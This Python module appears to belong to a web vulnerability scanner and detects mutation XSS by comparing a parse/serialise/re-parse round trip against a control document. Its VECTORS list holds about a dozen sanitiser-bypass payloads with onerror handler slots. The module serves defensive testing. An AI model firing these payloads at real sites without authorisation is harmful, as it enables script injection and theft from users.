"""Mutation XSS: the payload that only becomes a payload after a round trip.

Every payload in this module is *inert as delivered*. That is the whole point.
A sanitiser parses the attacker's markup, walks the resulting tree, serialises
it back to a string, and hands that string to ``innerHTML`` -- where a **second,
independent parser** runs. The HTML parsing algorithm has context-dependent
states (foreign content, RCDATA, raw text, ``<noscript>`` in scripting mode,
table foster-parenting), so ``parse(serialize(parse(x)))`` is not ``parse(x)``.
Text that the first parser treated as an attribute value can become a real tag
the second time, and an inert ``onerror`` string can become a live handler.

Why this needs its own detection stage instead of more payloads:

* The original HTTP response contains the marker in a harmless-looking position,
  so "reflected verbatim" is true and proves nothing.
* The payload does not execute in the page as served, so a browser check of the
  served response correctly reports *not observed*.
* The mutation happens inside the victim's client-side code. A scanner that
  never models that code path reports a clean result and is wrong.

The model therefore reproduces the sanitiser's contract with a control: load the
raw markup in one throwaway document and the serialise/parse output in another,
and compare.

* control executes          -> ordinary XSS; another stage already covers it
* control inert, test runs  -> genuine mutation XSS
* neither runs              -> the round trip is not the problem

The control is what makes the comparison mean something. A serialiser re-quotes
attributes (``src=x`` becomes ``src="x"``), so "the output differs from the
input" is true for almost every payload and proves nothing on its own.

Vectors are adapted from the published mutation-XSS literature (mXSS research
by Cure53/Google Project Zero and the DOMPurify advisory history). They are
kept as data so a new bypass is a one-line addition, not a code change.
"""
from __future__ import annotations

import json
import re

# ``__JS__`` is substituted literally (never via str.format): every vector below
# is quote-heavy markup, and a former bug in this codebase came from a template
# that was routed through .format().
#
# Each vector is a string a sanitiser is willing to accept: no <script>, no
# top-level event handler. The handler only appears after a parse/serialise/
# re-parse cycle moves a closing quote.
# Order matters: the per-point budget only covers the first few entries, so the
# vector that is empirically a genuine mutation comes first. Position was
# measured, not guessed -- see the round-trip notes in tests/test_mxss.py.
VECTORS: list[tuple[str, str]] = [
    # -- genuine mutation: inert on a single parse, executes after the round trip
    (
        "form-math-mglyph",
        '<form><math><mtext></form><form><mglyph><style></math>'
        '<img src=x onerror=__JS__>',
    ),
    # -- the round trip rewrites these, but no handler runs
    (
        "math-mtext-table",
        '<math><mtext><table><mglyph><style><!--</style>'
        '<img title="--><img src=x onerror=__JS__>">',
    ),
    (
        "select-option-style",
        '<select><option><style></select><img src=x onerror=__JS__></style>',
    ),
    (
        "math-option-mglyph",
        '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext>'
        '<style><a title="</style><img src=x onerror=__JS__>">',
    ),
    # -- these execute on a single parse in current Chromium, so the control
    #    document marks them as ordinary XSS; kept because other engines and
    #    older sanitisers did need the second parse
    (
        "noscript-p-title",
        '<noscript><p title="</noscript><img src=x onerror=__JS__>">',
    ),
    (
        "svg-style-a-id",
        '<svg></p><style><a id="</style><img src=x onerror=__JS__>">',
    ),
    (
        "xmp-p-title",
        '<xmp><p title="</xmp><img src=x onerror=__JS__>">',
    ),
    (
        "annotation-xml",
        '<math><annotation-xml encoding="text/html">'
        '<img src=x onerror=__JS__></annotation-xml></math>',
    ),
    (
        "foreignobject",
        '<svg><foreignObject><img src=x onerror=__JS__></foreignObject></svg>',
    ),
    # -- inert in every configuration tested so far; kept as regression canaries
    (
        "noembed-img",
        '<noembed><img src=x onerror=__JS__></noembed>',
    ),
    (
        "table-style-img",
        '<table><style><img src=x onerror=__JS__></style></table>',
    ),
    (
        "template-content",
        '<template><style><img src=x onerror=__JS__></style></template>',
    ),
]


def vectors(js: str, limit: int | None = None) -> list[tuple[str, str]]:
    """Return ``(name, markup)`` pairs with *js* placed in the handler slot."""
    out = [(name, markup.replace("__JS__", js)) for name, markup in VECTORS]
    return out[:limit] if limit else out


def looks_mutated(original: str, serialized: str) -> bool:
    """Did a parse/serialise cycle change the markup at all?

    Whitespace is ignored: the HTML serialiser re-quotes attributes and reports
    entities its own way, so a byte comparison would call every vector "mutated"
    and the signal would be worthless.
    """
    return _squash(original) != _squash(serialized)


def _squash(markup: str) -> str:
    return "".join((markup or "").split()).lower()


# A tag *prefix* is the only part of a vector a sanitiser is likely to preserve
# verbatim; matching single tag names is worthless because almost every page
# contains <style>, <form> or <img> in its own template.
_TAG_TOKEN_RE = re.compile(r"<\s*[a-zA-Z][^<>]*>")

# Client-side apps ship their initial state as JSON inside a script element and
# feed it to a DOM sink after JSON.parse. When that is how the value travels,
# the raw markup never appears in the document as markup -- only as an escaped
# string inside a text node -- yet a parser does receive it. The gate therefore
# has to look at the decoded value, not just at the served HTML.
_JSON_BLOCK_RE = re.compile(
    r"<script\b[^>]*\btype\s*=\s*[\"']?application/(?:ld\+)?json[\"']?[^>]*>"
    r"(.*?)</script\s*>",
    re.S | re.I,
)


def _decode_data_blocks(text: str) -> str:
    """Replace ``<script type="application/json">`` bodies with their value.

    A string-valued block is inlined as the string itself; anything else (an
    object, or a body that is not JSON) is left untouched. Escaping performed
    before encoding survives this step: ``html.escape`` then ``json.dumps``
    decodes back to ``&lt;form&gt;`` and is still rejected by the tag check,
    while a page that encodes the value raw decodes back to ``<form>``.
    """

    def repl(match: re.Match[str]) -> str:
        body = match.group(1)
        try:
            value = json.loads(body)
        except (TypeError, ValueError):
            return match.group(0)
        if not isinstance(value, str):
            return match.group(0)
        return " " + value + " "

    return _JSON_BLOCK_RE.sub(repl, text or "")


def markup_survives(text: str, markup: str) -> bool:
    """Is any of the vector's markup still markup in *text*?

    A page that escapes its output turns ``<form>`` into ``&lt;form&gt;``; the
    marker string still appears, but no parser will ever see a tag. Checking for
    a raw ``<tag`` before spending a browser load keeps the stage from probing
    every correctly-encoded endpoint in the application.

    JSON data blocks are decoded first: a dehydrated state blob is handed to a
    DOM sink by the page's own script, so its decoded value is what a parser
    will see, not the escaped text in the served document.
    """
    signature = _signature(markup)
    if not signature:
        return False
    return signature in _squash(_decode_data_blocks(text))


def _signature(markup: str) -> str:
    """Whitespace-insensitive prefix of the first two tags in *markup*.

    Single tag names are not evidence: a page template usually has its own
    ``<style>``, ``<form>`` or ``<img>``, so a name-only check passes on every
    endpoint. Two adjacent tags as the vector wrote them are specific enough to
    keep correctly-escaped pages out of the browser budget while still matching
    an endpoint that reflects the markup with cosmetic rewrites (a sanitiser
    that reorders the whole tree will fail the gate and only cost one request).
    """
    tags = _TAG_TOKEN_RE.findall(markup or "")
    if len(tags) >= 2:
        return _squash(tags[0] + tags[1])
    return _squash(tags[0]) if tags else ""


def probe(browser, markup: str, target_id: str) -> dict:
    """Run one vector through parse -> serialise -> re-parse in a real browser.

    Returns a dict with ``mutated`` (the serialised text differs), ``activated``
    (the re-parsed document produced the artifact), ``ordinary`` (the raw markup
    already executes on a single parse) and ``mxss`` (activated and not
    ordinary). ``proof`` is one sentence suitable for a report.
    """
    result = browser.roundtrip(markup, target_id)
    if not result.get("ok"):
        reason = result.get("error", "round trip failed")
        return {"mutated": False, "activated": False, "ordinary": False,
                "mxss": False, "error": reason,
                "proof": f"the round trip could not be run: {reason}"}
    serialized = str(result.get("serialized") or "")
    activated = bool(result.get("activated"))
    control = bool(result.get("control_activated"))
    mutated = looks_mutated(markup, serialized)
    out = {
        "mutated": mutated,
        "activated": activated,
        "ordinary": control,
        "serialized": serialized,
        "artifact": str(result.get("hit") or ""),
        "control_artifact": str(result.get("control_hit") or ""),
        "how": result.get("how", ""),
    }
    if activated and control:
        out["proof"] = ("the raw markup already executes on a single parse, so the round "
                        "trip is not what makes it dangerous: ordinary XSS")
    elif activated and mutated:
        out["proof"] = (
            "inert as delivered, but parse/serialise/re-parse produced a document "
            f"that executed the handler (node <{out['artifact']}>)")
    elif activated:
        out["proof"] = ("the markup was inert in the control document but executes after "
                        "re-parsing, although the serialised form is unchanged")
    elif mutated:
        out["proof"] = "the round trip rewrote the markup but no handler ran"
    else:
        out["proof"] = "the round trip left the markup unchanged"
    out["mxss"] = activated and not control
    return out
